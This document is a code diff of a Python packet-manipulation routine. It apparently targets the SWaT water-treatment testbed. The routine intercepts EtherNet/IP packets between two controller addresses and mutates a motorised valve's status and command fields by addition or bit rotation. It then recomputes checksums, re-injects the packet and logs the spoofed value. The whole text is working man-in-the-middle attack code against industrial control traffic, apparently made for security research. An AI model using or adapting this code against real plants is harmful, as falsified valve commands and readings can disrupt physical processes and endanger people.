@@ -112,12 +112,12 @@ def __extract(packet):
     if 'MV' in device:
 
         # MV Mutation
-        if (str(packet.src) == '192.168.1.20' and enip_tcp.ENIP_SendRRData in packet and str(packet.dst) == '192.168.1.10'):
+        if (str(pkt.src) == '192.168.1.20' and enip_tcp.ENIP_SendRRData in pkt and str(pkt.dst) == '192.168.1.10'):
             ind = device.index('MV')
             mut = mutation[ind]
             val = value[ind]
-            if SWAT_MV in packet:
-                true_value_motor = packet[SWAT_MV].status
+            if SWAT_MV in pkt:
+                true_value_motor = pkt[SWAT_MV].status
 
                 if mut in ('ASD','ALD','ARD'):
                     mutate_value_motor = true_value_motor + val
@@ -132,26 +132,24 @@ def __extract(packet):
                     elif mutate_value_motor < 0:
                         mutate_value_motor = 0
                 elif mut == 'BSL': 
-                    shift = rol(packet[SWAT_MV].status,val,8)
+                    shift = rol(pkt[SWAT_MV].status,val,8)
                     mutate_value_motor = shift
                 elif mut == 'BSR': 
-                    shift = ror(packet[SWAT_MV].status,val,8)
+                    shift = ror(pkt[SWAT_MV].status,val,8)
                     mutate_value_motor = shift
 
-                mutate_value_motor = 1
+                pkt[SWAT_MV].status = mutate_value_motor
+                pkt[SWAT_MV].cmd = mutate_value_motor
 
-                packet[SWAT_MV].status = mutate_value_motor
-                packet[SWAT_MV].cmd = mutate_value_motor
+                del pkt[TCP].chksum  # Need to recompute checksum
+                del pkt[IP].chksum
 
-                del packet[TCP].chksum  # Need to recompute checksum
-                del packet[IP].chksum
+                pkt.show2()
+                packet.set_payload(str(pkt)) #manipulated packet
 
-                packet.show2()
-                packet.set_payload(str(packet)) #manipulated packet
-
-                spoofed_measurement =  packet[SWAT_MV].status
+                spoofed_measurement =  pkt[SWAT_MV].status
                 print('Changed packet from MV %1.4f to %1.4f ' % (true_value_motor,spoofed_measurement))
-                print ("packet from %s to %s" %(packet.src,packet.dst))
+                print ("packet from %s to %s" %(pkt.src,pkt.dst))
 
             
          
